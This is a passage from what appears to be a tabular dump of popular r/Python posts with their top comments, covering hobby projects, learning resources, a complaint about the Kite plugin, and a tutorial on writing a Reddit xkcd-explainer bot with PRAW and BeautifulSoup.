* [best-of-python-dev](https://github.com/ml-tooling/best-of-python-dev): Python developer tools and libraries.
* [best-of-web-python](https://www.reddit.com/r/flask/comments/kx8mlu/bestofwebpython_a_ranked_list_of_awesome_python/): Python libraries for web development.
* [best-of-jupyter](https://www.reddit.com/r/IPython/comments/kx8v15/p_bestofjupyter_a_ranked_list_of_awesome_jupyter/): Jupyter Notebook, Hub, and Lab projects.

📫 For updates on trending projects, new additions and detailed comparisons, follow us on [Twitter](https://twitter.com/mltooling) or subscribe to our weekly [newsletter](https://mltooling.substack.com/subscribe).","Docopt needs to be replaced with docopt-ng.  Stars aren't everything.  Docopt-ng is docopt, but with testing, bug fixes, and useful error messages.

PyQt and PySide should be on there before quiet a few other libraries on there.  I'd even let wxPython on."
Made a program that makes a photo mosaic out of any image.,gt5ups,2020-05-30 09:49:59,,You are a fucking genius ahahahaha
Gitutor: A command line app that makes Git easy,iajyrr,2020-08-16 09:45:39,,"Does this actually teach the formal git commands while using clearer language, or does it just replace the commands with a more user-friendly interface? Both ideas are useful, but I’d only call the first one a “tutor”.

Edit: I just want to add that I have real frustrations with the language of the commands in git, so I really appreciate some of the clearer syntax demonstrates with this tool. I just wish it would tell me what it was doing in git terms as I used it."
I made a face recognition program in Python by using the pre-trained model to compute face embedding. Next based on these face embedding I am able to classify between all the faces in my data. It works fine but is really slow when executed in real-time. I have a low-end i3 laptop without GPU.,j38z5c,2020-10-01 21:53:33,,Fr yujkvq
Python + Quantum Research = Art + Saving 1000s hours of CPU time,eaanag,2019-12-14 06:01:57,,"# [*Adaptive*](https://github.com/python-adaptive/adaptive/): parallel active learning of mathematical functions

This is a **quantum physics** calculation in progress.

When evaluating a function numerically we would like to sample it more densely in the interesting regions instead of evaluating it on a manually-defined homogeneous grid. 
Together with my colleagues, we wrote an open-source Python software package [Adaptive](https://github.com/python-adaptive/adaptive/) that evaluates the function at the optimal points by analyzing existing data and planning ahead on the fly.
With a few lines of code you define your goal, evaluate functions on a computing cluster, and live-plot the data.
It performs averaging of stochastic functions, interpolation of vector-valued one and two-dimensional functions, and one-dimensional integration.

This figure is from one of my recent papers [Spin-Orbit Protection of Induced Superconductivity in Majorana Nanowires](https://arxiv.org/pdf/1807.01940.pdf).

What you see here is how the calculation progresses in time. You see that as time progresses it starts to find the narrow lines (which have a physical meaning). For aesthetic purposes, I change the colormap slowly which is meaningless but pretty. The vertices (corners) of the white triangles on top of the plot represent the points are which the underlying function is evaluated. The >1000 years of computation time is based on a comparison between a homogeneous grid. If we take the size of the smallest triangle, the computation time with adaptive (2 weeks on 300 cores), and assume that all the features larger than the smallest triangles have been resolved, then the calculation would have taken 3134 years.

You can recreate this video by using [this](https://gist.github.com/basnijholt/7aaeb7b9c506f830e6791d264a6cf467) script and [this data](http://files.nijho.lt/data.pickle).
The entire source code for generating the data is [here](https://github.com/basnijholt/spin-orbit-nanowires) (be warned, you probably need a supercomputer). 

See (star) ⭐️ the repo on [github.com/python-adaptive/adaptive](https://github.com/python-adaptive/adaptive) and the documentation on [adaptive.readthedocs.io](http://adaptive.readthedocs.io).

Try `pip install adaptive[notebook]` or `conda install adaptive` :-)

You can also run Adaptive code live in Binder [here](https://mybinder.org/v2/gh/python-adaptive/adaptive/master?filepath=example-notebook.ipynb)!

P.S. adaptive has already been used in several other scientific publications, see the [gallery](https://adaptive.readthedocs.io/en/latest/usage_examples.html)!"
I made a tool to download and set wallpapers from Reddit.,caac6i,2019-07-08 02:48:08,,"You made a thing.  I tell people trying to learn anything, learn a bit and apply it to something you need.

Nice!"
Andrew Ng's Machine Learning Course will be re-released in PYTHON this summer! (finally!),uhzg3u,2022-05-04 13:26:32,"Over the past 10 years 4.8 million people enrolled in the original Machine Learning Coursera course, but it wasn't in Python. 

[https://www.deeplearning.ai/program/machine-learning-specialization/](https://www.deeplearning.ai/program/machine-learning-specialization/)

&#x200B;

https://preview.redd.it/udhjjt849ex81.png?width=829&format=png&auto=webp&s=95774a979542960c764365468f34d20b8d57d026",How should I pronounce *Ng*?
"Codecademy is giving its pro subscription for free to help students, and they've got a great Python 3 course. Maybe you should enroll and utilize your time while in quarantine!",fo0eyj,2020-03-24 14:35:51,,Actual link: [Codecademy Pro learn from home ](https://pro.codecademy.com/learn-from-home/)
Me doing my CS projects.,91ol3u,2018-07-25 12:14:33,,Use a good editor/IDE. No more indentation errors.
Here are my Python projects from 2018! (Mostly Game Dev),ab97g3,2019-01-01 01:32:28,,"Damn its beautiful, im learning to make games myself. Founf your work quite inspirational. "
"Interactive Chord Diagrams with the new ""chord"" Python package",fwraav,2020-04-08 03:48:55,,I can only assume this is Pokémon and it’s beautiful. Great work
PSA: Kite is a viral plugin that kills your system performance,pn49pa,2021-09-13 08:07:25,"I am doing a PSA:

Please be extra careful when you see Kite (the program auto-completor app). This app is atrociously bad for performance, it  spreads to all of your system (and I mean ALL of your system), and the developers intentionally made it hard for you to remove it. I made the mistake of installing it when I was trying out Spyder IDE. I didn't realize this app installed itself across all of my editors, including neovim. I started noticing that my neovim would get several seconds of hiccup when I was running  python REPL, which had never happened before. Soon my Linux system started experiencing severe hiccup as well. Then I did some profiling and found out that Kite was making background process calls without my consent. The  worst part yet is they made it nearly impossible for you uninstall it, not unless you download their shady app manager or make a curl call to a completely unknown api server just to uninstall apps on your computer. I don't even want to know what kind of personal information / data that they were stealing from my computer. I fail to see how Kite is different from a virus. Please use extra caution when going through IDE setup as something like Kite can easily creep in and contaminate your whole system just like that. To the developers of Spyder and VSCode and other IDEs, please take active step in banning an app like Kite that severely infringes upon the privacy and right of their users. By promoting this app as an extension, you are potentially endangering millions of your users!

EDIT on 9/13/2021:

I wanted to attach my comment response to juliusc (maintainer of Spyder) to the main post, as it echoes my core concerns. I want to thank juliusc for responding to this post.

**Hi juliusc,**

**First of all, I want to thank you for engaging this post and responding to my concerns. I took some time to collect my thoughts and just wanted to share them with you and other developers of popular development tools like Spyder, VSCode, Atom etc. By no means am I trying to single out Spyder, and I want you to know that I deeply appreciate all the work that you guys have done to empower everyone by democratizing better development tools.**

**I would like to point out though, that there was nothing ""light"" about the promotion of Kite in Spyder. As me and other users have noted, Kite installation during the initialization setup of Spyder was an opt-out by default. I am sure many people either clicked through the setup and installed Kite without reading the ""fine-prints"" as is totally reasonable for an average user, and/or they mistakenly assumed that Kite is a safe and secure plugin that had been vetted by the Spyder developers, as it's one of the first things that you see when you start using Spyder. Without sounding accusatory, I was very disappointed that the Spyder developers allowed this to happen. Since I haven't been monitoring your git tracker issues related to Kite (because frankly it's not my job), I will take your word for it that not many Spyder users raised my concern. But anyone who just googles Kite will quickly discover that Kite had severe security/privacy concerns, was an invasive software, and its company conducted extremely questionable business practices in other open source packages as far back as 2017. In fact, the very same announcement post of Kite's sponsorship of Spyder in 2019 already had several users that raised their concerns in the comments section (**[**https://www.spyder-ide.org/blog/spyder-kite-funding/**](https://www.spyder-ide.org/blog/spyder-kite-funding/)**). I don't think it's fair to say that well since the users didn't find any issue and complained about them on git, then we will let it slide. I get that you guys are maintaining/developing Spyder for all of us for free, but I also uphold you to a higher standard because a single bad commit or decision by you can lead to disproportional effects on the rest of us. And sometimes these effects take a while for us to find out and may have irreversible and disastrous consequences. I truly beseech you to be truthful with us and with yourselves, whether if corporate sponsorship, financial or otherwise, means that you can lower the standard that you hold for software integration, even if it comes at the cost of your users. Because if that is the case, then it's a slippery slope to the end of free and open source development as we know it.**

**Okay, enough of a long rant. Thank you for reading it.**

&#x200B;","+1 to this, kite is annoying. I used to run spyder on my work laptop because windows and since 4.0 hit the preferences got weird

If you downgrade to 3.x then spyder is a nice ide"
Face tracking anime girl with proximity detection,8pa8ff,2018-06-07 21:19:27,,Oh god what have you done
I made a very pointless program that takes an image and converts it into a spreadsheet (1 pixel = 1 cell) but im very proud of it regardless. Source code in comments,wdgcq8,2022-08-01 20:33:04,"&#x200B;

https://reddit.com/link/wdgcq8/video/h9796dxaj3f91/player",Jesse I've turned into a spreadsheet
I'm giving away my book on writing beautiful Python for free to celebrate its alpha release,mp49qo,2021-04-12 09:43:57,"**TL;DR**

**update**: the book is now free forever!
Here's the link: [https://gumroad.com/l/pydonts](https://gumroad.com/l/pydonts).

When 2021 started, I started publishing a weekly series on my blog on how to write more Pythonic code. This “Pydont's” series is, and will always be, available for free on my blog for everyone to read: [https://mathspp.com/blog/pydonts](https://mathspp.com/blog/pydonts).

However, to make it more convenient for everyone to read all the articles and to create something more formal, I decided to also publish the collection of articles as a book.
You can get the book for free if you use this coupon code: [https://gumroad.com/l/pydonts/w99ucle](https://gumroad.com/l/pydonts/w99ucle).

The series of articles is still ongoing, as I release a new article every week. Therefore, the book will be updated as these new articles come out.
I am also considering adding a little something _only_ in the book, but I haven't decided what I will be doing, so feel free to drop your suggestions in the comments below!

I am really, really excited to share this with you, as sharing knowledge is one of my life's greatest passions! I hope you can download the book and learn something from it :) Be sure to let me know your feedback.

**Edit**: the feedback has been overwhelming and I am humbled by your support! Thank you so much :) I would love to get some testimonials to add to the book page, so if you have anything to say that I could use, please email me (contacts in the blog) or send me a DM over Reddit! Thank you so much!",">I am also considering adding a little something only in the book

Exercises/Quiz and maybe links to code snippets in open-source projects to highlight how they are using a particular feature.

Good luck!"
"Hey guys, it's me again, with my latest Python GUI for uninstalling the default Windows 10 apps, PyDebloatX.",kmvanp,2020-12-30 12:48:55,"It's been a few months since I introduced my personal project here. For those who don't know, this is a simple interface for uninstalling those default apps that come with Windows 10.  There are also EXE binaries in the GitHub Releases, for those who want to run it without Python.

I don't really like ""advertising"", so I thought a post at the end of the year should be fine. I hope you find it useful!

[GitHub link](https://github.com/Teraskull/PyDebloatX/?v=n)

Happy holidays!

https://preview.redd.it/kt9kodjv59861.png?width=533&format=png&auto=webp&s=5cc843dec7a7bae70af75c4541048e25b1e4efe1","This is beautiful. Thanks for sharing.
Debloating is my first step when setting up a Win10 install for someone (I'm a Linux guy on my own machines)"
render 3d cube wireframe in console,a27d7u,2018-12-02 06:08:06,,"if someone need it  https://github.com/vanyakosmos/ascii-canvas/blob/012b70fa57f3fe990997370b459f1cb3429268f5/playground.py
"
"I'm Al Sweigart, author of Automate the Boring Stuff with Python. I'm currently doing an AMA about my latest book on recursive algorithms.",xcr4tt,2022-09-13 07:08:18,"Please post question to the AMA thread rather than on this post. Thank you!

https://www.reddit.com/r/IAmA/comments/xcp6jv/im_al_sweigart_author_of_several_free_programming/

EDIT: Heyas, I'm done for the day. Thanks to everyone who asked questions!","The layout of online book is messed up in Firefox 104.0.2 (latest). The chapter intro is overlapping an image.

The Dev Console shows the warning,

>This page is in Quirks Mode. Page layout may be impacted. For Standards Mode use “<!DOCTYPE html>”.

If I save a page and add the `DOCTYPE`, it appears to fix the issue.

I'm using uBlock and DuckDuckGo Privacy Essentials, but I'm not seeing any network or JS errors that suggest anything is being blocked.

I tried to post this in the linked thread, but it got automatically deleted."
"(PyAutoGui, AHK, Python) Twitch Plays League of Legends",ff7rhi,2020-03-08 12:55:52,,"I'm not sure if you're using this, but there's a [Python wrapper for AHK](https://github.com/spyoungtech/ahk) that could be pretty useful for something like this.

^(Full disclosure: I author this wrapper)"
Ultimate Python study guide,inllmf,2020-09-06 21:00:22,"[https://github.com/huangsam/ultimate-python](https://github.com/huangsam/ultimate-python)

Ultimate Python study guide for newcomers and professionals alike. 🐍 🐍 🐍

    print(""Ultimate Python study guide"")

I created a GitHub repo to share what I've learned about [core Python](https://www.python.org/) over the past 5+ years of using it as a college graduate, an employee at large-scale companies and an open-source contributor of repositories like [Celery](https://github.com/celery/celery) and [Full Stack Python](https://github.com/mattmakai/fullstackpython.com). I look forward to seeing more people learn Python and pursue their passions through it. 🎓

Here are the primary goals of creating this guide:

🏆 **Serve as a resource** for Python newcomers who prefer to learn hands-on. This repository has a collection of standalone modules which can be run in an IDE like [PyCharm](https://www.jetbrains.com/pycharm/) and in the browser like [Repl.it](https://repl.it/languages/python3). Even a plain old terminal will work with the examples. Most lines have carefully crafted comments which guide a reader through what the programs are doing step-by-step. Users are encouraged to modify source code anywhere as long as the mainroutines are not deleted and [run successfully](https://github.com/huangsam/ultimate-python/blob/master/runner.py) after each change.

🏆 **Serve as a pure guide** for those who want to revisit core Python concepts. Only [builtin libraries](https://docs.python.org/3/library/) are leveraged so that these concepts can be conveyed without the overhead of domain-specific concepts. As such, popular open-source libraries and frameworks are not installed. However, reading the source code in these frameworks is inspiring and highly encouraged if your goal is to become a true [Pythonista](https://www.urbandictionary.com/define.php?term=pythonista).","If you are someone who's comfortable with the language basics but not yet an expert, you might enjoy this list of popular **[Python tools](https://pythonautomationtutorial.com/tools-for-automation-in-python)** which are commonly used in the wild. This might also help you come up with some project ideas to pursue next."
I made a script that organizes a folder!,fygn3n,2020-04-10 22:19:18,,There is no README in your Git repository. This might make it difficult for others to use your script.
"Second year calculus done entirely in PYTHON: No pencil or paper is required! Included are things that are traditionally a pain to deal with, such as path and surface integrals. See comments for more info",nzlqr6,2021-06-14 20:33:11,,"Sympy is a gem with some perhaps underappreciated functionality, one of my favorites is using it to solve beam bending problems and generating shear force & bending moment diagrams, something that is a bit tedious to do by hand: https://docs.sympy.org/latest/modules/physics/continuum_mechanics/beam_problems.html"
Chess game python,g939sg,2020-04-27 23:51:53,,"Here is the code: [https://github.com/j00nas/python-chess-game-GUI](https://github.com/j00nas/python-chess-game-GUI)

It is a simple python made chess game to run in the console ([chess.py](https://chess.py))or you can play via GUI (see chess\_GUI.py). Since I know its far away from perfect I decided to upload it anyawys to get a step into github and to present my first little project to the world.  Happy appreciate feedback!"
I made a command line program that plays random animal videos to cheer you up.,d7tcmk,2019-09-23 01:11:15,,What OS is that
A post of appreciation of development of Python,n6ecne,2021-05-07 02:42:06,"As you may heard, there are released notes on what's new in Python 3.10.

Among a lot of new additions I would say that one of the greatest updates that came is improvement of error messages. Not only are they now much better at locating the error, they are now even more descriptive. And what's cooler is that they are now also suggestive. 

Example:

if x = 2

Earlier: SyntaxError: invalid syntax

Now: SyntaxError: cannot assign to attribute here. Maybe you meant ""=="" instead of ""=""?


And it would even try to see if there is a similarly named variables, if you typed in wrong name. 

Example (from notes):

\>\>\> schwarzschild_black_hole = None

\>\>\> schwarschild_black_hole

... NameError: name 'schwarschild_black_hole' is not defined. Did you mean: schwarzschild_black_hole?


Huge appreciation to Pablo Galindo who contributed to all these error message improvements!

Source: https://docs.python.org/3.10/whatsnew/3.10.html","Here's my favourite example they gave:

Before 3.10

    >>> foo(x, z for z in range(10), t, w)
      File ""<stdin>"", line 1
        foo(x, z for z in range(10), t, w)
               ^
    SyntaxError: Generator expression must be parenthesized

As of 3.10

    >>> foo(x, z for z in range(10), t, w)
      File ""<stdin>"", line 1
        foo(x, z for z in range(10), t, w)
               ^^^^^^^^^^^^^^^^^^^^
    SyntaxError: Generator expression must be parenthesized

It just more clearly indicates what needs to be done and I love how they're thinking about that with these error messages which will be of particular help for those new to Python."
The BEST update for my 3D renderer! I added Gouraud shading and the result is really satisfying. All of these have been rendered with it:,bp0pq0,2019-05-16 01:20:25,,"This is officially the best update yet.

\- A new shading mode: Gouraud (smooth) shading! This took more than I expected but the results are beyond my expectations, too.

\- Backface culling can now be turned off.

\- Some processes have been optimized a LOT (up to 1000 times!)

\- Many functions have been commented

\- You can now change the resolution! Now both a potato and a NASA computer can use this program at full capacity.

&#x200B;

Get it here: [https://github.com/Forfunckle/rendeer](https://github.com/Forfunckle/rendeer)

&#x200B;

Thank you all for the huge amount of support and advice that motivated me to keep updating it. By making this program I learned a lot of new things and I'm thankful to everyone for it!"
"My last post about Face recognition got amazing response from all of you guys on Python subreddit, I added few faces to the model and now it can recognise my mother too that too in low light, its amazing.I ll post link to script in the comment below.",j3rg8c,2020-10-02 17:24:07,,"My guy, just take a screenshot."
A very basic `ls` clone with hyperlinked filenames,guq34c,2020-06-02 02:34:21,,This was a bit of an experiment. I wish bash did this natively. Code [here](https://github.com/willmcgugan/rich/blob/master/examples/listdir.py).
"I made an Ai discord bot for Coronavirus [Predictions , Statistics and over 100 visuals & features]",hswvwc,2020-07-17 22:43:38,,"Add it to your own server: [https://discord.com/api/oauth2/authorize?client\_id=731855425145798668&permissions=121856&scope=bot](https://discord.com/api/oauth2/authorize?client_id=731855425145798668&permissions=121856&scope=bot)

The code for the discord bot and the machine learning part for making predictions and visualizations are bot open source and you can add it in your own servers without worrying about things like hosting !

Github repo: [https://github.com/himanshu2406/Corona-Tracker-Bot](https://github.com/himanshu2406/Corona-Tracker-Bot)

In case you are interested it was made with python , keras , discord py, plotly and is open source, automatically updates the visuals, graphs ,etc every 24h and the statistics in every 10 minutes ! Integrated with over 100 graphs / analytical visuals and more , going to add correlations in the future so that everyone can get a better view at how covid is doing currently globally or in your country and also might help someone in their independent analysis.

PS: Ofc the machine learning model predictions follow the trend and can't consider external factors like Vaccine creation or trump fing up more somehow, no need to take these predictions very seriously.

Data from : John Hopkins (For predictions and graphs) \[Updates every day\]

Worldometer (for statistics) \[Updates every 10 minutes\]"
Big respect to 90’s programmers and before. I can’t imagine how horrible today’s programmers would be without the Internet?,wh1p73,2022-08-06 01:47:18,I can’T imagine creating a full program without the help of Google. Just wanted to pay homage to those that came before me. They must have been so disciplined and smart.,"I lived for the O'Reilly books! I'd argue it was better in some ways since not everyone was some kind of ""expert"" you had well curated examples and explanations."
"My First Book: 200 Python Exercises, An Introduction to Python",jdyt3z,2020-10-19 17:53:36,,How can I assess the quality of the exercises if there isn’t a single exercise in the preview? :(
Gamestonk Terminal: The equivalent to an open-source python Bloomberg Terminal.,m515yk,2021-03-15 02:44:13,"[https://github.com/DidierRLopes/GamestonkTerminal](https://github.com/DidierRLopes/GamestonkTerminal)

If you like stocks and are careful with the way you spend your money, (me saying it seems counter-intuitive given that I bought GME at the peak, I know) you know how much time goes into buying shares of a stock.

You need to: Find stocks that are somehow undervalued; Research on the company, and its competitors; Check that the financials are healthy; Look into different technical indicators; Investigate SEC fillings and Insider activity; Look up for next earnings date and analysts estimates; Estimate market’s sentiment through Reddit, Twitter, Stocktwits; Read news;. … the list goes on.

It’s tedious and I don’t have 24k for a Bloomberg terminal. Which led me to the idea during xmas break to spend the time creating my own terminal. I introduce you to “Gamestonk Terminal” (probably should’ve sent 1 tweet everyday to Elon Musk for copyrights permission eheh).

As someone mentioned, this is meant to be like a swiss army knife for finance. It contains the following functionalities:

* **Discover Stocks:** Some features are: Top gainers; Sectors performance; upcoming earnings releases; top high shorted interest stocks; top stocks with low float; top orders on fidelity; and some SPAC websites with news/calendars.
* **Market Sentiment:** Main features are: Scrolling through Reddit main posts, and most tickers mentions; Extracting trending symbols on stocktwits, or even stocktwit sentiment based on bull/bear flags; Twitter in-depth sentiment prediction using AI; Google mentions over time.
* **Research Web pages:** List of good pages to do research on a stock, e.g. macroaxis, zacks, macrotrends, ..
* **Fundamental Analysis:** Read financials from a company from Market Watch, Yahoo Finance, Alpha Vantage, and Financial Modeling Prep API. Since I only rely on free data, I added the information from all of these, so that the user can get it from the source it trusts the most. Also exports management team behind stock, along with their pages on Google, to speed up research process.
* **Technical Analysis:** The usual technical indicators: sma, rsi, macd, adx, bbands, and more.
* **Due Diligence:** It has several features that I found to be really useful. Some of them are: Latest news of the company; Analyst prices and ratings; Price target from several analysts plot over time vs stock price; Insider activity, and these timestamps marked on the stock price historical data; Latest SEC fillings; Short interest over time; A check for financial warnings based on Sean Seah book.
* **Prediction Techniques:** The one I had more fun with. It tries to predict the stock price, from simple models like sma and arima to complex neural network models, like LSTM. The additional capability here is that all of these are easy to configure. Either through command line arguments, or even in form of a configuration file to define your NN.
* **Reports**: Allows you to run several jobs functionalities and write daily notes on a stock, so that you can assess what you thought about the stock in the past, to perform better decisions.
* **Comparison Analysis**: Allows you to compare stocks.
* **On the ROADMAP**: Cryptocurrencies, Portfolio Analysis, Credit Analysis. Feel free to add the features you'd like and we would happily work on it.

NOTE: This project will always remain open-source, and the idea is that it can grow substantially over-time so that more and more people start taking advantage of it.

I hope you find this useful, and even contribute to the project! The installation guidelines are in a much better state now, so it should be much easier to install and play with it.

Thanks!

https://preview.redd.it/iemlf1kah1n61.png?width=464&format=png&auto=webp&s=33e25d9397c9e5a1c3d90ff786f17dab6f521753",Awesome project!
"I wrote a Reddit bot in Python a few weeks back, and asked people if they were interested in learning the process, tools and practices. I'm posting it on r/Python, and hope you find it helpful.",78uvdw,2017-10-26 19:16:44,"Hello all

I asked you people if you are interested in learning Python by writing a Reddit bot some time back on r/learnprogramming. I received immense number of responses, so I'm posting it on r/python. It covers the process, practices and tools involved in writing a Reddit bot in Python.

Please post your feedback and questions in comments, and I'll be happy to answer them.

#**Requirements**:

1. You are somewhat familiar with programming in general, and have an idea about Python or other languages (like what are variables etc)
2. You  are on a Unix-like system with access to command line tools
3. Familiarity with [git](https://git-scm.com/) and [Github](https://github.com/) (Not really required...it is better if you are familiar)
4. A Reddit account

Even if you don't meet these requirements...no need to worry!

#**Introduction**

Writing a bot for Reddit is easier than you think, because Reddit provides a structured method to access its data via the [Reddit API](https://www.reddit.com/dev/api). There are amazing tools like [PRAW](https://praw.readthedocs.io/en/latest/) which can help simplify the process. PRAW is a Python wrapper for Reddit, and it takes the pain out of the process of writing a bot.


And as I said earlier, Python is an great language, which is easy to grasp for beginners. What even more amazing is it's community, which has made incredible open-source tools and libraries for almost anything. We will be using some of those, and you will realise how useful they are!

#**Important information - Please read**

1. While this post will cover a variety of programming topics, I highly encourage you to explore more. Go ahead and read the documentation of libraries used and think about how can you improve something in your project. I will possibly add more topics to this post.

2. Please **DO NOT CREATE SPAM** by letting your bot run on all of Reddit before you have thoroughly tested it. **r/test** exists for you to do all sorts of testing with your bot...please use it. Refer to [botiquette](https://www.reddit.com/wiki/bottiquette) and keeping in mind the type of bot you create, comply with the guidelines.

#**The code and resources**

I jus wrote a bot for Reddit, which posts a textual explanation of the popular webcomic [xkcd](https://www.xkcd.com) whenever it encounters an xkcd link. It is named **explainxkcdbot**. As of now, I have set my bot to run on r/test only to let you people test it all you want.


You can find the complete source code on my Github page - 
**https://github.com/aydwi/explainxkcdbot**

Here is the code for the bot -
**https://github.com/aydwi/explainxkcdbot/blob/master/explainxkcdbot.py**


#**How to run the bot**

The process is given here - https://github.com/aydwi/explainxkcdbot/blob/master/README.md

If you have any problems in running the bot, please let me know in the comments.


#**Let us begin**

We will move forward step-by-step in the code, and see what is going on.

##Section 1 - Importing libraries


https://gist.github.com/aydwi/e5e4f294b66adf1cb025a70a0392f847


This is the beginning of the program. Any line which begins with a `#` sign is a comment in Python, so it is not interpreted as code. Then we import the essential libraries required for out program. These libraries contain the methods (or functions) which we will use throughout our program. The syntax is pretty straightforward. Next we see 3 variables with some values assigned to them. More on them later.


##Section 2 - Authenticating


https://gist.github.com/aydwi/b941d04d8128e415d6630e961cc97988


This is where important things begin. Before proceeding, you should have a basic idea of what are **[classes](https://docs.python.org/3/tutorial/classes.html)** and **[methods](https://stackoverflow.com/questions/3786881/what-is-a-method-in-python)** in Python. One more important thing is an **object** - it is an instance of class, which holds the data variables declared in class and the **member functions work on these objects**. Please make a comment if you do not understand, I will try to explain.


`def authenticate():` defines a function which will try to authenticate the bot to Reddit. This is where PRAW comes into play as it provides us methods to do this. Remember we created a *praw.ini* file earlier. It is a configuration file that stores authentication credentials, so that you just call it whenever needed.


Next, we pass authentication parameters to `praw.Reddit()`. Here `explainbot` refers to the credentials in the configuration file, and `user_agent` is a descriptive string about your script/bot. This returns a [Reddit instance](https://praw.readthedocs.io/en/latest/code_overview/reddit_instance.html), which we assign to the variable `reddit`, and use this variable whenever we wish to authenticate.


Next up, we make a print statement to see who is getting authenticated i.e. the name. The `user` class in PRAW provides methods for the currently authenticated user. We call the method `me()` on `user` and then call it on the variable holding the Reddit instance for authentication, which in our case is `reddit`. So the statement becomes `reddit.user.me()`. We just use some [formatting in python](https://pyformat.info/) to print it.


Finally we `return` the variable `reddit`. Now i can use this `authenticate()` function in my program by calling it when I need it, and it will give me the variable `reddit`, which stores the Reddit instance.

------------------------------

**Important note 1:** Why did I create a function? It is because creating functions makes us easy to manage out code. We write separate functions for separate features of the program, and call them wherever needed. This breaks the code into manageable chunks, which makes it easy to read, modify and debug.

------------------------------

##Section 3 - Scraping


https://gist.github.com/aydwi/699123424e7b38da19d62e69339e859c


Next up is the function `def fetchdata(url)`. Notice how this function takes a parameter `url`. We pass this parameter whenever we call this function. The purpose of this function is to scrape/gather the data from the web, in order to post an explanation.


**Now scraping is not a very reliable process**, but sometimes we just have to do it. We go to a website, go through it's HTML source, and extract the text, links etc. that we want. Here we use **[Requests](http://docs.python-requests.org/en/master/user/quickstart/#make-a-request)** library to make a web request, and **[Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)** to extract the data.


`r = requests.get(url)` gives a Response object called `r`. We can get all the information we need from this object. Then we call the method `content` on `r`, and pass it to `soup = BeautifulSoup(r.content, 'html.parser')`, which gives us a `soup` object with which we can retrieve elements of a web page. Read more [here](https://www.crummy.com/software/BeautifulSoup/bs4/doc/).


Now what happens depends on what are you scraping. Every website has different type of content, and you should go through the HTML to see how can you retrieve what you want. In my case http://explainxkcd.com has it's explanation inside the first few `<p>` tags, so I look for the first `<p>` tag by `tag = soup.find('p')`. Also, immediately after the explanation ends, `<h2>` tag follows, so I know where to stop. Now take a look here-

    while True:
        if isinstance(tag, bs4.element.Tag):
            if tag.name == 'h2':
                break
            if tag.name == 'h3':
                tag = tag.nextSibling
            else:
                data = data + '\n' + tag.text
                tag = tag.nextSibling
        else:
            tag = tag.nextSibling

I continue to look through the tags, and store textual data in a `string` named `data` and move to the next tag. I `break` the process if I encounter `<h2>` because I know that is where explanation ends. The code depends on the structure of website you are scraping. Finally, I return `data`, so that now when I call the function like `fetchdata('http://explainxkcd.com/1024')` for example, it returns me the explanation of comic 1024 as a `string` named `data`.

----------------

**Important note 2:** Scraping is unreliable. If the website changes it's structure, you have to change your code. In this case, it can still include some tags which we don't want. The line `if (tag.name == 'h3')` in the above function is for handling one such unexpected situation I encountered on http://explainxkcd.com. This is why we like to have APIs. 

--------------------------


##Section 4 - Using regular expressions, parsing URLs, handling exceptions and preventing duplicate submissions


https://gist.github.com/aydwi/700db3e46770d13fe89356d0fa4f570d


This function which takes a parameter which is a Reddit instance (remember that Reddit instance from Section 1). Again we use PRAW to get one or more subreddits, and go through their comments. See [here](https://praw.readthedocs.io/en/latest/code_overview/reddit/subreddits.html) and [here](http://praw.readthedocs.io/en/latest/code_overview/models/comment.html).

You can pass multiple subreddits like `for comment in reddit.subreddit('test+learnprogramming+pics')`.

**Regular Expressions**: Now I want to extract xkcd links from the comments, so I need to look for a pattern for the URL. xkcd links are of the form `https://www.xkcd.com/[some number]`. So we make use of regular expressions from the `re` library to match the pattern. [More about regular expressions](https://regexone.com/references/python).

    match = re.findall(""https://www.xkcd.com/[0-9]+"", comment.body)
        if match:
            print(""Link found in comment with comment ID: "" + comment.id)
            xkcd_url = match[0]

Here I look for all strings that are like `https://www.xkcd.com/[some number]` using the method `findall` from [user comments](http://praw.readthedocs.io/en/latest/code_overview/models/comment.html), and if it matches, it returns a list with the matching URL, and we store our URL in the variable `xkcd_url`.

----------------

**Important note 3:** Try to find out regular expressions (regex) to improve this program. What happens if a user posts 'https://xkcd.com/1024' or http version as 'http://www.xkcd.com/1024'. These are still valid xkcd URLs. There can be some other cases where the URL might be placed between a bunch of symbols in a comment. Try to modify the regex statement so that it can detect these cases as well.

--------------------------


**URL parsing**: Now I have an xkcd URL. I have 2 immediate objectives now- 

Objective 1. To extract the comic number at the end of the URL. We use [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) for this purpose.

    url_obj = urlparse(xkcd_url)
            xkcd_id = int((url_obj.path.strip(""/"")))

Objective 2. Form a complete **explainxkcd.com** URL, which I will pass as a parameter to the function `fetchdata(url)` (See Section 2)

    myurl = 'http://www.explainxkcd.com/wiki/index.php/' + str(xkcd_id)

Both objectives are thus complete.

**Preventing duplicate submissions and Exception handling**: The bot needs to make sure it replies to every comment only once. There are many methods you can try which include using a separate key-value database like [Memcached](https://memcached.org/), but we will use a simpler approach.


Just create a text file (remember commented.txt), store the comment ID of a comment in it when you  visit a relevant comment, and verify if a comment ID already exists in that file before making new comments. Remember to put the location of the text file in the `path` variable (from Section 1), so that you can pass it to the method `open()`.


Now, what happens when a user makes a comment like 'https://www.xkcd.com/689243348723'. This xkcd does not exist, but the program will extract '689243348723', then form a link like http://www.explainxkcd.com/wiki/index.php/689243348723, and pass it to the function `fetchdata(url)`. Now **the function will return an exception and your program will stop/crash**. You need to take care of these situations.

This is achieved using `try`, `except` and `else` blocks. [See here](https://docs.python.org/3/tutorial/errors.html) Here is the code for these 2 steps-

    file_obj_r = open(path,'r')
                        
            try:
                explanation = fetchdata(myurl)
            except:
                print('Exception!!! Possibly incorrect xkcd URL...\n')
                # Typical cause for this will be a URL for an xkcd that does not exist (Example: https://www.xkcd.com/772524318/)
            else:
                if comment.id not in file_obj_r.read().splitlines():
                    print('Link is unique...posting explanation\n')
                    comment.reply(header + explanation + footer)
                    
                    file_obj_r.close()

                    file_obj_w = open(path,'a+')
                    file_obj_w.write(comment.id + '\n')
                    file_obj_w.close()
                else:
                    print('Already visited link...No reply needed\n')


Notice how I make a reply to a relevant comment by using the variables from Section 1 to print header and footer description alongside the explanation - `comment.reply(header + explanation + footer)`


Next we make some `sleep` statements to stop the bot from querying Reddit too fast. If the Reddit API returns an error due to too many requests, adjust `val` in the instances of `time.sleep(val)` in your program.


##Section 5: The main function


https://gist.github.com/aydwi/99323ebd710428f4590077a844236f83


